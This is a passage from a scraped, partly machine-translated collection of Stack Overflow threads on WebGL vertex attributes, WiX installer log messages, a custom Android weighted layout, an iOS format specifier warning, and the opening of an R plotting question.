  gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
}

// draw
gl.useProgram(program1Attrib);
gl.drawArrays(gl.POINTS, 0, 9);
const err = gl.getError();
console.log(err ? `ERROR: ${twgl.glEnumToString(gl, err)}` : 'no WebGL errors');
```

```
canvas { border: 1px solid black; }
```

```
<script src="https://twgljs.org/dist/4.x/twgl-full.min.js"></script>
<p>
1st it draws 3 points (3 vertices, 2 attributes)<br/>
2nd it draws 9 points (9 vertices, 1 attribute)<br/>
It does NOT call gl.disableVertexAttrib so on the second draw call one of the attributes is still enabled. It is pointing to a buffer with only 3 vertices in it even though 9 vertices will be drawn. There are no errors.
</p>
<canvas></canvas>
```

另一个例子，只需启用所有属性，然后使用不使用属性的着色器进行绘制（无错误），并使用使用 1 个属性的着色器进行绘制（再次无错误），无需调用`gl.disbleVertexAttribArray`

```
const gl = document.querySelector("canvas").getContext("webgl");

const vsUses1Attributes = `
attribute vec4 position;

void main() {
  gl_Position = position;
  gl_PointSize = 20.0;
}
`;
const vsUses0Attributes = `
void main() {
  gl_Position = vec4(0, 0, 0, 1);
  gl_PointSize = 20.0;
}
`
const fs = `
precision mediump float;
void main() {
  gl_FragColor = vec4(1, 0, 0, 1);
}
`;

const program0Attribs = twgl.createProgram(gl, [vsUses0Attributes, fs]);
const program1Attrib  = twgl.createProgram(gl, [vsUses1Attributes, fs]);

function createBuffer(data) {
  const buf = gl.createBuffer();
  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data), gl.STATIC_DRAW);
  return buf;
}

const buffer3Points = createBuffer([
  -0.7, 0.5,
   0.0, 0.5,
   0.7, 0.5,
]);

const buffer0Points = createBuffer([]);

// enable all the attributes and bind a buffer to them
const maxAttrib = gl.getParameter(gl.MAX_VERTEX_ATTRIBS);
for (let i = 0; i < maxAttrib; ++i) {
  gl.enableVertexAttribArray(i);
  gl.vertexAttribPointer(i, 2, gl.FLOAT, false, 0, 0);
}

gl.useProgram(program0Attribs);
gl.drawArrays(gl.POINTS, 0, 1);

gl.useProgram(program1Attrib);
const posLoc = gl.getAttribLocation(program1Attrib, 'position');
gl.bindBuffer(gl.ARRAY_BUFFER, buffer3Points);
gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
gl.drawArrays(gl.POINTS, 0, 3);

const err = gl.getError();
console.log(err ? `ERROR: ${twgl.glEnumToString(gl, err)}` : 'no WebGL errors');
```

```
canvas { border: 1px solid black; }
```

```
<script src="https://twgljs.org/dist/4.x/twgl-full.min.js"></script>
<p>
1st it enables all attributes<br/>
2nd it draws 1 point that needs no attributes (no error)<br/>
3rd it draws 3 points that need 1 attribute (no error)<br/>
It does NOT call gl.disableVertexAttribArray on any of the attributes so they are all still enabled.  There are no errors.
</p>
<canvas></canvas>
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-11-13T06:55:49.550

对于 webGL，我将选择**yes**，调用 gl.disableVertexAttribArray 很重要。

Chrome 给了我这个警告：

```
WebGL: INVALID_OPERATION: drawElements: attribs not setup correctly 
```

当程序更改为使用少于最大属性数的程序时，就会发生这种情况。显然，解决方案是在绘制之前禁用未使用的属性。

如果您的所有程序都使用相同数量的属性，那么您可能会在初始化时调用 gl.enableVertexAttribArray 一次。否则，您需要在更改程序时对其进行管理。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2020-11-26T16:43:50.927

将其视为属性是 VAO 的本地属性，而不是着色器程序。VBO 在 GPU 内存中。

现在考虑一下，在 WebGL 中，WebGL 默认使用一个默认的 VAO。（它也可以是程序员创建的 VAO，同样的概念适用）。此 VAO 包含一个名为 ARRAY_BUFFER 的目标，GPU 内存中的任何 VBO 都可以绑定到该目标。此 VAO 还包含具有固定数量的属性槽的属性数组（数量取决于实现和平台，这里假设为 8，这是 Webgl 规范要求的最小值）。此外，此 VAO 将具有 ELEMENT_ARRAY_BUFFER 目标，任何索引数据缓冲区都可以绑定到该目标。

现在，当您创建着色器程序时，它将具有您指定的属性。当您链接着色器程序时，Webgl 会将可能的属性槽“编号”之一分配给程序中指定的所有属性。现在属性将使用 VAO 中的相应属性槽来访问绑定到 VAO 中的 ARRAY_BUFFER 或 ELEMENT_ARRAY_BUFFER 目标的数据。现在，当您使用函数 gl.enableVertexAttribArray(location) 和 gl.vertexAttribPointer(location,....) 时，您不会更改着色器程序中属性的任何特征（它们只是有一个属性编号，它引用其中一个他们将用于访问数据的 VAO 中的属性槽）。您实际上正在做的是使用其位置编号修改 VAO 中属性槽的状态。因此，为了让程序中的属性能够访问数据，必须启用其在 VAO 中的相应属性槽 (gl.enableVertexAttribArray())。我们必须配置属性槽，以便它可以正确地从绑定到 ARRAY_BUFFER 的缓冲区中读取数据（gl.vertexAttribPointer()）。一个 VBO 设置为一个不会改变的插槽，即使我们将它与目标解除绑定，只要它在 GPU 内存中，属性插槽 csn 仍然从 VBO 变为红色。此外，必须有一些缓冲区绑定到 VAO 的目标 (gl.bindBuffer())。所以 gl.enableVertexAttribArray(location) 将启用当前 VAO 中 'location' 指定的属性槽。gl.disableVertexAttribArray(location) 将禁用它。但它与着色器程序无关。即使您使用不同的着色器程序，

因此，如果两个不同的着色器程序使用相同的属性槽，则不会出现任何错误，因为 VAO 中对应的属性槽已经处于活动状态。但是如果需要属性在两个着色器程序中以不同方式解释数据，则可能会错误地读取来自目标的数据。现在考虑，如果两个着色器程序使用不同的属性槽，那么您可能会启用第二个着色器程序所需的属性槽，并认为您的程序应该可以工作。但是已经启用的属性槽（由之前的着色器程序启用）仍将启用但不会使用。这会导致错误。

因此，在更改着色器程序时，我们必须确保必须禁用该着色器程序不会使用的 VAO 中启用的属性槽。尽管我们现在可以显式指定任何 VAO，但 Webgl 默认情况下是这样工作的。

一种方法是在 javascript 端维护启用的属性列表，并在切换程序时禁用所有启用的属性槽，同时仍使用相同的 VAO。处理此问题的另一种方法是创建仅由一个着色器程序访问的自定义 VAO。但效率较低。还有一种方法是在使用 gl.bindAttribLocation() 链接着色器程序之前将属性位置绑定到固定槽。

# wix - Windows installer log files showing a large group 2360 messages

> ID：12427881
> 
> 赞同：0
> 
> 时间：2012-09-14T15:47:15.177
> 
> 标签：wix, windows-installer, wix3.5, custom-action, wix3

I am trying to run an installer using the MSI command line option so that I can run it in debug mode and see the logs.

The logs that I am getting are quite large (near to 1 MB) and they are full of the following messages:

```
MSI (s) (F8:5C) [16:26:27:385]: Note: 1: 2360 
```

I want to know if this is something to worry about? I have looked up the error code 2360 at [Windows Installer Error Messages page](http://msdn.microsoft.com/en-us/library/aa372835%28v=vs.85%29.aspx) on msdn and all it says that

> Progress tick.

Is there something that I need to change in my installer?

I have recently added a CustomAction that makes use of System.Xml namespace. Could this be a cause?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-01-07T15:35:09.740

我是第一次与微星合作，我明白你在说什么。

您收到“注 1：2360”的原因是计算机正在写入。写需要很长时间，这就是为什么有这么多。看看 2360 之前的 4 行。它会是这样的

```
Executing op: FileCopy(SourceName=somename,...)
File: <filepath>filename;  To be installed;   won't patch;    No existing file
Source for file 'bunch of letters and numbers' is compressed
Note: 1: 2318 2: <filepath>filename
Note: 1: 2360
Note: 1: 2360
etc...
etc... 
```

它尝试对现有文件进行 FileCopy。发现不存在。标识源文件。抛出新文件的错误代码 2318，因为它还不存在（2318 表示文件不存在）。然后它开始写入并通过打印出“Note: 1: 2360”来告诉你它在做什么。

如果您再次运行安装程序，我相信您会在日志中的任何位置找到零“注意：1：2360”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-15T18:36:39.570

这不应该是因为 Xml 命名空间。请在命令提示符下运行此命令并提供错误详细信息

```
msiexec /i "Path to msi" /l*v log.log 
```

一旦出现错误，您可以使用**[WiLogUtl](http://msdn.microsoft.com/en-us/library/windows/desktop/aa372811%28v=vs.85%29.aspx)**读取日志文件。该工具随 Windows SDK 提供。该报告还将帮助您获得准确的错误位置

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T16:11:28.073

I have found some information in the comments to article posted [here](http://msdn.microsoft.com/en-us/library/windows/desktop/aa372835%28v=vs.85%29.aspx)

*> Most times these "Note:" entires are just for information but sometimes they are precursors to other errors.*

posted by

Robert Flaming Windows Installer Program Manager [1](http://msdn.microsoft.com/en-us/library/windows/desktop/aa372835%28v=vs.85%29.aspx)

I hope the messages that I am getting are in fact just for information.

# android - 替换 linearLayout 权重机制

> ID：12427885
> 
> 赞同：18
> 
> 时间：2012-09-14T15:47:24.980
> 
> 标签：android, android-layout, android-linearlayout, android-layout-weight, android-percent-library

背景：

*   出于性能考虑，Google 建议避免使用嵌套加权线性布局。
*   使用嵌套加权线性布局很难读、写和维护。
*   放置可用大小百分比的视图仍然没有很好的选择。唯一的解决方案是权重和使用 OpenGL。甚至没有像 WPF/Silverlight 上显示的“viewBox”这样的东西来自动缩放。

这就是为什么我决定创建自己的布局，你可以告诉每个孩子的确切重量（和周围的重量）与其大小相比应该是什么。

看来我已经成功了，但由于某种原因，我认为有些错误我无法追踪。

错误之一是 textView，即使我为它提供了很多空间，它也会将文本放在顶部而不是中心。另一方面，imageViews 工作得很好。另一个错误是，如果我在自定义布局中使用布局（例如 frameLayout），则不会显示其中的视图（但布局本身会）。

请帮我弄清楚它为什么会发生。

如何使用：而不是下一次使用线性布局（我故意使用长 XML，以展示我的解决方案如何缩短内容）：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
  xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent"
  android:layout_height="match_parent" android:orientation="vertical">

  <View android:layout_width="wrap_content" android:layout_height="0px"
    android:layout_weight="1" />

  <LinearLayout android:layout_width="match_parent"
    android:layout_height="0px" android:layout_weight="1"
    android:orientation="horizontal">

    <View android:layout_width="0px" android:layout_height="wrap_content"
      android:layout_weight="1" />

    <TextView android:layout_width="0px" android:layout_weight="1"
      android:layout_height="match_parent" android:text="@string/hello_world"
      android:background="#ffff0000" android:gravity="center"
      android:textSize="20dp" android:textColor="#ff000000" />

    <View android:layout_width="0px" android:layout_height="wrap_content"
      android:layout_weight="1" />

  </LinearLayout>
  <View android:layout_width="wrap_content" android:layout_height="0px"
    android:layout_weight="1" />
</LinearLayout> 
```

我所做的很简单（x 是将视图本身放在权重列表中的位置）：

```
<com.example.weightedlayouttest.WeightedLayout
  xmlns:android="http://schemas.android.com/apk/res/android"
  xmlns:app="http://schemas.android.com/apk/res/com.example.weightedlayouttest"
  xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent"
  android:layout_height="match_parent" tools:context=".MainActivity">

  <TextView android:layout_width="0px" android:layout_height="0px"
    app:horizontalWeights="1,1x,1" app:verticalWeights="1,1x,1"
    android:text="@string/hello_world" android:background="#ffff0000"
    android:gravity="center" android:textSize="20dp" android:textColor="#ff000000" />

</com.example.weightedlayouttest.WeightedLayout> 
```

我的特殊布局代码是：

```
public class WeightedLayout extends ViewGroup
  {
  @Override
  protected WeightedLayout.LayoutParams generateDefaultLayoutParams()
    {
    return new WeightedLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.WRAP_CONTENT);
    }

  @Override
  public WeightedLayout.LayoutParams generateLayoutParams(final AttributeSet attrs)
    {
    return new WeightedLayout.LayoutParams(getContext(),attrs);
    }

  @Override
  protected ViewGroup.LayoutParams generateLayoutParams(final android.view.ViewGroup.LayoutParams p)
    {
    return new WeightedLayout.LayoutParams(p.width,p.height);
    }

  @Override
  protected boolean checkLayoutParams(final android.view.ViewGroup.LayoutParams p)
    {
    final boolean isCorrectInstance=p instanceof WeightedLayout.LayoutParams;
    return isCorrectInstance;
    }

  public WeightedLayout(final Context context)
    {
    super(context);
    }

  public WeightedLayout(final Context context,final AttributeSet attrs)
    {
    super(context,attrs);
    }

  public WeightedLayout(final Context context,final AttributeSet attrs,final int defStyle)
    {
    super(context,attrs,defStyle);
    }

  @Override
  protected void onLayout(final boolean changed,final int l,final int t,final int r,final int b)
    {
    for(int i=0;i<this.getChildCount();++i)
      {
      final View v=getChildAt(i);
      final WeightedLayout.LayoutParams layoutParams=(WeightedLayout.LayoutParams)v.getLayoutParams();
      //
      final int availableWidth=r-l;
      final int totalHorizontalWeights=layoutParams.getLeftHorizontalWeight()+layoutParams.getViewHorizontalWeight()+layoutParams.getRightHorizontalWeight();
      final int left=l+layoutParams.getLeftHorizontalWeight()*availableWidth/totalHorizontalWeights;
      final int right=r-layoutParams.getRightHorizontalWeight()*availableWidth/totalHorizontalWeights;
      //
      final int availableHeight=b-t;
      final int totalVerticalWeights=layoutParams.getTopVerticalWeight()+layoutParams.getViewVerticalWeight()+layoutParams.getBottomVerticalWeight();
      final int top=t+layoutParams.getTopVerticalWeight()*availableHeight/totalVerticalWeights;
      final int bottom=b-layoutParams.getBottomVerticalWeight()*availableHeight/totalVerticalWeights;
      //
      v.layout(left+getPaddingLeft(),top+getPaddingTop(),right+getPaddingRight(),bottom+getPaddingBottom());
      }
    }

  // ///////////////
  // LayoutParams //
  // ///////////////
  public static class LayoutParams extends ViewGroup.LayoutParams
    {
    int _leftHorizontalWeight =0,_rightHorizontalWeight=0,_viewHorizontalWeight=0;
    int _topVerticalWeight    =0,_bottomVerticalWeight=0,_viewVerticalWeight=0;

    public LayoutParams(final Context context,final AttributeSet attrs)
      {
      super(context,attrs);
      final TypedArray arr=context.obtainStyledAttributes(attrs,R.styleable.WeightedLayout_LayoutParams);
        {
        final String horizontalWeights=arr.getString(R.styleable.WeightedLayout_LayoutParams_horizontalWeights);
        //
        // handle horizontal weight:
        //
        final String[] words=horizontalWeights.split(",");
        boolean foundViewHorizontalWeight=false;
        int weight;
        for(final String word : words)
          {
          final int viewWeightIndex=word.lastIndexOf('x');
          if(viewWeightIndex>=0)
            {
            if(foundViewHorizontalWeight)
              throw new IllegalArgumentException("found more than one weights for the current view");
            weight=Integer.parseInt(word.substring(0,viewWeightIndex));
            setViewHorizontalWeight(weight);
            foundViewHorizontalWeight=true;
            }
          else
            {
            weight=Integer.parseInt(word);
            if(weight<0)
              throw new IllegalArgumentException("found negative weight:"+weight);
            if(foundViewHorizontalWeight)
              _rightHorizontalWeight+=weight;
            else _leftHorizontalWeight+=weight;
            }
          }
        if(!foundViewHorizontalWeight)
          throw new IllegalArgumentException("couldn't find any weight for the current view. mark it with 'x' next to the weight value");
        }
        //
        // handle vertical weight:
        //
        {
        final String verticalWeights=arr.getString(R.styleable.WeightedLayout_LayoutParams_verticalWeights);
        final String[] words=verticalWeights.split(",");
        boolean foundViewVerticalWeight=false;
        int weight;
        for(final String word : words)
          {
          final int viewWeightIndex=word.lastIndexOf('x');
          if(viewWeightIndex>=0)
            {
            if(foundViewVerticalWeight)
              throw new IllegalArgumentException("found more than one weights for the current view");
            weight=Integer.parseInt(word.substring(0,viewWeightIndex));
            setViewVerticalWeight(weight);
            foundViewVerticalWeight=true;
            }
          else
            {
            weight=Integer.parseInt(word);
            if(weight<0)
              throw new IllegalArgumentException("found negative weight:"+weight);
            if(foundViewVerticalWeight)
              _bottomVerticalWeight+=weight;
            else _topVerticalWeight+=weight;
            }
          }
        if(!foundViewVerticalWeight)
          throw new IllegalArgumentException("couldn't find any weight for the current view. mark it with 'x' next to the weight value");
        }
      //
      arr.recycle();
      }

    public LayoutParams(final int width,final int height)
      {
      super(width,height);
      }

    public LayoutParams(final ViewGroup.LayoutParams source)
      {
      super(source);
      }

    public int getLeftHorizontalWeight()
      {
      return _leftHorizontalWeight;
      }

    public void setLeftHorizontalWeight(final int leftHorizontalWeight)
      {
      _leftHorizontalWeight=leftHorizontalWeight;
      }

    public int getRightHorizontalWeight()
      {
      return _rightHorizontalWeight;
      }

    public void setRightHorizontalWeight(final int rightHorizontalWeight)
      {
      if(rightHorizontalWeight<0)
        throw new IllegalArgumentException("negative weight :"+rightHorizontalWeight);
      _rightHorizontalWeight=rightHorizontalWeight;
      }

    public int getViewHorizontalWeight()
      {
      return _viewHorizontalWeight;
      }

    public void setViewHorizontalWeight(final int viewHorizontalWeight)
      {
      if(viewHorizontalWeight<0)
        throw new IllegalArgumentException("negative weight:"+viewHorizontalWeight);
      _viewHorizontalWeight=viewHorizontalWeight;
      }

    public int getTopVerticalWeight()
      {
      return _topVerticalWeight;
      }

    public void setTopVerticalWeight(final int topVerticalWeight)
      {
      if(topVerticalWeight<0)
        throw new IllegalArgumentException("negative weight :"+topVerticalWeight);
      _topVerticalWeight=topVerticalWeight;
      }

    public int getBottomVerticalWeight()
      {
      return _bottomVerticalWeight;
      }

    public void setBottomVerticalWeight(final int bottomVerticalWeight)
      {
      if(bottomVerticalWeight<0)
        throw new IllegalArgumentException("negative weight :"+bottomVerticalWeight);
      _bottomVerticalWeight=bottomVerticalWeight;
      }

    public int getViewVerticalWeight()
      {
      return _viewVerticalWeight;
      }

    public void setViewVerticalWeight(final int viewVerticalWeight)
      {
      if(viewVerticalWeight<0)
        throw new IllegalArgumentException("negative weight :"+viewVerticalWeight);
      _viewVerticalWeight=viewVerticalWeight;
      }
    }
  } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-08T16:40:11.613

我接受了您的挑战并尝试创建您描述的布局以响应我的评论。你说的对。出乎意料地难以完成。除此之外，我确实喜欢拍摄家蝇。所以我加入进来，想出了这个解决方案。

1.  扩展现有的布局类，而不是从头开始创建自己的。我从 RelativeLayout 开始，但所有人都可以使用相同的方法。这使您能够在您不想操作的子视图上使用该布局的默认行为。

2.  我在布局中添加了四个属性，称为顶部、左侧、宽度和高度。我的意图是通过允许诸如“10%”、“100px”、“100dp”等值来模仿 HTML。此时唯一接受的值是表示父级百分比的整数。“20” = 布局的 20%。

3.  为了获得更好的性能，我允许 super.onLayout() 执行它的所有迭代，并且只在最后一次通过时使用自定义属性操作视图。由于这些视图将独立于兄弟姐妹进行定位和缩放，我们可以在其他一切都解决后移动它们。

这是 atts.xml

```
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <declare-styleable name="HtmlStyleLayout">
        <attr name="top" format="integer"/>
        <attr name="left" format="integer"/>
        <attr name="height" format="integer"/>
        <attr name="width" format="integer"/>

    </declare-styleable>
</resources> 
```

这是我的布局类。

```
package com.example.helpso;

import android.content.Context;
import android.content.res.TypedArray;
import android.util.AttributeSet;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.RelativeLayout;

public class HtmlStyleLayout extends RelativeLayout{

    private int pass =0;
    @Override
      protected HtmlStyleLayout.LayoutParams generateDefaultLayoutParams()
        {
        return new HtmlStyleLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT,RelativeLayout.LayoutParams.WRAP_CONTENT);
        }

      @Override
      public HtmlStyleLayout.LayoutParams generateLayoutParams(final AttributeSet attrs)
        {
        return new HtmlStyleLayout.LayoutParams(getContext(),attrs);
        }

      @Override
      protected RelativeLayout.LayoutParams generateLayoutParams(final android.view.ViewGroup.LayoutParams p)
        {
        return new HtmlStyleLayout.LayoutParams(p.width,p.height);
        }

      @Override
      protected boolean checkLayoutParams(final android.view.ViewGroup.LayoutParams p)
        {
        final boolean isCorrectInstance=p instanceof HtmlStyleLayout.LayoutParams;
        return isCorrectInstance;
        }

    public HtmlStyleLayout(Context context, AttributeSet attrs) {
        super(context, attrs);

    }

    public void setScaleType(View v){
        try{
            ((ImageView) v).setScaleType (ImageView.ScaleType.FIT_XY);
        }catch (Exception e){
            // The view is not an ImageView 
        }
    }

    @Override
      protected void onLayout(final boolean changed,final int l,final int t,final int r,final int b)
        {
        super.onLayout(changed, l, t, r, b);           //Let the parent layout do it's thing

        pass++;                                        // After the last pass of
        final int childCount = this.getChildCount();   // the parent layout
        if(true){                        // we do our thing

            for(int i=0;i<childCount;++i)
              {
              final View v=getChildAt(i);
              final HtmlStyleLayout.LayoutParams params = (HtmlStyleLayout.LayoutParams)v.getLayoutParams();

              int newTop = v.getTop();                 // set the default value
              int newLeft = v.getLeft();               // of these to the value
              int newBottom = v.getBottom();           // set by super.onLayout() 
              int newRight= v.getRight();             
              boolean viewChanged = false;

              if(params.getTop() >= 0){
                  newTop = ( (int) ((b-t) * (params.getTop() * .01))  );
                  viewChanged = true;
              }

              if(params.getLeft() >= 0){
                  newLeft = ( (int) ((r-l) * (params.getLeft() * .01))  );
                  viewChanged = true;
              }

              if(params.getHeight() > 0){
                  newBottom = ( (int) ((int) newTop + ((b-t) * (params.getHeight() * .01)))  );
                  setScaleType(v);                        // set the scale type to fitxy
                  viewChanged = true;
              }else{
                  newBottom = (newTop + (v.getBottom() - v.getTop()));
                  Log.i("heightElse","v.getBottom()=" +
                          Integer.toString(v.getBottom())
                          + " v.getTop=" +
                          Integer.toString(v.getTop()));
              }

              if(params.getWidth() > 0){
                  newRight = ( (int) ((int) newLeft + ((r-l) * (params.getWidth() * .01)))  );
                  setScaleType(v);
                  viewChanged = true;
              }else{
                  newRight = (newLeft + (v.getRight() - v.getLeft()));
              }

                // only call layout() if we changed something
                if(viewChanged)
                    Log.i("SizeLocation",
                            Integer.toString(i) + ": "
                            + Integer.toString(newLeft) + ", "
                            + Integer.toString(newTop) + ", "
                            + Integer.toString(newRight) + ", "
                            + Integer.toString(newBottom));
                v.layout(newLeft, newTop, newRight, newBottom);
              }

            pass = 0;                                 // reset the parent pass counter
        }
        }

     public  class LayoutParams extends RelativeLayout.LayoutParams
        {

        private int top, left, width, height;
        public LayoutParams(final Context context, final AttributeSet atts) {
            super(context, atts);
            TypedArray a = context.obtainStyledAttributes(atts, R.styleable.HtmlStyleLayout);
            top =  a.getInt(R.styleable.HtmlStyleLayout_top , -1);
            left = a.getInt(R.styleable.HtmlStyleLayout_left, -1);
            width = a.getInt(R.styleable.HtmlStyleLayout_width, -1);
            height = a.getInt(R.styleable.HtmlStyleLayout_height, -1);
            a.recycle();

        }
        public LayoutParams(int w, int h) {
            super(w,h);
            Log.d("lp","2");
        }
        public LayoutParams(ViewGroup.LayoutParams source) {
            super(source);
            Log.d("lp","3");
        }
        public LayoutParams(ViewGroup.MarginLayoutParams source) {
            super(source);
            Log.d("lp","4");
        }
        public int getTop(){
            return top;
        }
        public int getLeft(){
            return left;
        }
        public int getWidth(){
            return width;
        }
        public int getHeight(){
            return height;
        }
        }
} 
```

这是一个示例活动 xml

```
<com.example.helpso.HtmlStyleLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    xmlns:html="http://schemas.android.com/apk/res/com.example.helpso"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <ImageView
        android:id="@+id/imageView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_alignParentLeft="true"
        android:layout_alignParentRight="true"
        android:layout_alignParentTop="true"
        android:scaleType="fitXY"
        android:src="@drawable/bg" />

    <ImageView
        android:id="@+id/imageView2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@drawable/overlay"
        html:height="10"
        html:left="13"
        html:top="18"
        html:width="23" />

</com.example.helpso.HtmlStyleLayout> 
```

这是我用于测试的图像。

![bg](../Images/bb6106104559bb47c84fad121e768866.png) ![在此处输入图像描述](../Images/48e5d6f4cace7a143917899f65c5233c.png)

如果您没有为特定属性设置值，则将使用默认值。因此，如果您设置宽度而不是高度，则图像将按宽度缩放，而 wrap_content 将按高度缩放。

[压缩的项目文件夹。](https://docs.google.com/open?id=0B2BD9i1zpmm5QVpVcGN6NTNHQ2s)

[APK](https://docs.google.com/open?id=0B2BD9i1zpmm5LWo4d3JCR0VIRWM)

我找到了错误的来源。问题是我使用布局的子计数来指示它将对 onLayout 进行多少次调用。这在旧版本的 android 中似乎并不成立。我注意到在 2.1 中 onLayout 只被调用一次。所以我改变了

```
if(pass == childCount){ 
```

到

```
if(true){ 
```

它开始按预期工作。

我仍然认为只有在 super 完成后才调整布局是有益的。只需要找到一种更好的方法来知道那是什么时候。

**编辑**

我没有意识到您的意图是以逐像素精度将图像拼凑在一起。我通过使用双浮点精度变量而不是整数来实现您正在寻找的精度。但是，在允许图像缩放的同时，您将无法完成此操作。当图像被放大时，像素会在现有像素之间的某个间隔处添加。新像素的颜色是周围像素的加权平均值。当您独立缩放图像时，它们不会共享任何信息。结果是你总是会在接缝处有一些伪影。再加上舍入的结果，因为您不能有部分像素，并且您将始终具有 +/-1 像素容差。

要验证这一点，您可以在高级照片编辑软件中尝试相同的任务。我使用 PhotoShop。使用与我的 apk 中相同的图像，我将它们放在单独的文件中。我将它们垂直缩放了 168%，水平缩放了 127%。然后我将它们放在一个文件中并尝试对齐它们。结果与我的apk中看到的完全相同。

为了演示布局的准确性，我在我的 apk 中添加了第二个活动。在这个活动中，我没有缩放背景图像。其他一切都完全相同。结果是无缝的。

我还添加了一个按钮来显示/隐藏覆盖图像和一个在活动之间切换的按钮。

我更新了我的谷歌驱动器上的 apk 和压缩项目文件夹。您可以通过上面的链接获得它们。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-08T09:36:28.317

试过你的代码后，我才找到你提到的问题的原因，这是因为在你自定义的布局中，你只是正确地**布局**了孩子，但是你忘记正确**测量**你的孩子，这将直接影响绘图层次，所以只需添加以下代码，它对我有用。

```
 @Override
protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
    int widthSize = MeasureSpec.getSize(widthMeasureSpec)-this.getPaddingRight()-this.getPaddingRight();
    int widthMode = MeasureSpec.getMode(widthMeasureSpec);

    int heightSize = MeasureSpec.getSize(heightMeasureSpec)-this.getPaddingTop()-this.getPaddingBottom();
    int heightMode = MeasureSpec.getMode(heightMeasureSpec);

    if(heightMode == MeasureSpec.UNSPECIFIED || widthMode == MeasureSpec.UNSPECIFIED)
        throw new IllegalArgumentException("the layout must have a exact size");

    for (int i = 0; i < this.getChildCount(); ++i) {
        View child = this.getChildAt(i);
        LayoutParams lp = (LayoutParams)child.getLayoutParams();
        int width = lp._viewHorizontalWeight * widthSize/(lp._leftHorizontalWeight+lp._rightHorizontalWeight+lp._viewHorizontalWeight);
        int height =  lp._viewVerticalWeight * heightSize/(lp._topVerticalWeight+lp._bottomVerticalWeight+lp._viewVerticalWeight);
        child.measure(width | MeasureSpec.EXACTLY,  height | MeasureSpec.EXACTLY);
    }

    this.setMeasuredDimension(MeasureSpec.getSize(widthMeasureSpec), MeasureSpec.getSize(heightMeasureSpec));

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-08-03T16:24:06.820

现在有一个比我制作的自定义布局更好的解决方案：

[**百分比相对布局**](https://juliengenoud.github.io/android-percent-support-lib-sample/)

教程可以在[**这里**](http://www.androidauthority.com/using-the-android-percent-support-library-630715/)找到，repo 可以在[**这里**](https://github.com/JulienGenoud/android-percent-support-lib-sample)找到。

示例代码：

```
<android.support.percent.PercentRelativeLayout
         xmlns:android="http://schemas.android.com/apk/res/android"
         xmlns:app="http://schemas.android.com/apk/res-auto"
         android:layout_width="match_parent"
         android:layout_height="match_parent"/>
     <ImageView
         app:layout_widthPercent="50%"
         app:layout_heightPercent="50%"
         app:layout_marginTopPercent="25%"
         app:layout_marginLeftPercent="25%"/>
 </android.support.percent.PercentFrameLayout/> 
```

或者：

```
 <android.support.percent.PercentFrameLayout
         xmlns:android="http://schemas.android.com/apk/res/android"
         xmlns:app="http://schemas.android.com/apk/res-auto"
         android:layout_width="match_parent"
         android:layout_height="match_parent"/>
     <ImageView
         app:layout_widthPercent="50%"
         app:layout_heightPercent="50%"
         app:layout_marginTopPercent="25%"
         app:layout_marginLeftPercent="25%"/>
 </android.support.percent.PercentFrameLayout/> 
```

我想知道它是否可以处理我在这里展示的问题。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-06T08:24:27.077

我建议使用以下优化：

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
  xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent"
  android:layout_height="match_parent" android:gravity="center">

    <TextView android:layout_width="wrap_content"
      android:layout_height="wrap_content" android:text="@string/hello_world"
      android:background="#ffff0000" android:gravity="center"
      android:textSize="20dp" android:textColor="#ff000000" />

</FrameLayout> 
```

或使用[http://developer.android.com/reference/android/widget/LinearLayout.html#attr_android:weightSum](http://developer.android.com/reference/android/widget/LinearLayout.html#attr_android:weightSum)

或将 TableLayout 与 layout_weight 一起用于行和列

或使用网格布局。

# iphone - iphone - format specifiers

> ID：12427886
> 
> 赞同：2
> 
> 时间：2012-09-14T15:47:25.643
> 
> 标签：iphone, ios, ipad

I am using [this code](https://code.google.com/r/gaoyijun-plot/source/browse/UIColor-Expanded.m) from a guy

in the middle of this code, we have

```
- (NSString *)hexStringFromColor {
        return [NSString stringWithFormat:@"%0.6X", self.rgbHex];
} 
```

This was working fine until Xcode 4.4\. Now, I see this error: **format specifies type unsigned int but the argument has type UInt32 (aka unsigned long).**

Why is Xcode complaining in 4.4 but not before? what specifier should I use?

thanks.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:55:01.410

由于`rgbHex`似乎是一个无符号长整数，因此正确的格式说明符`@"%0.6lX"`是`l`代表`long`.

[iOS 字符串格式说明符列表](http://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/Strings/Articles/formatSpecifiers.html#//apple_ref/doc/uid/TP40004265-SW1)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T15:53:13.097

Try `%0.6lX`，其中 'l' 指定后面的 'X' 是 long 而不是 int。`ll`如果值实际上是 long long，您也可以使用。

![在此处输入图像描述](../Images/70449f6b745ecaf777d39ab86c235272.png)

# r - How to plot 'multiple box plots' in one plot?

> ID：12427887
> 
> 赞同：6
> 
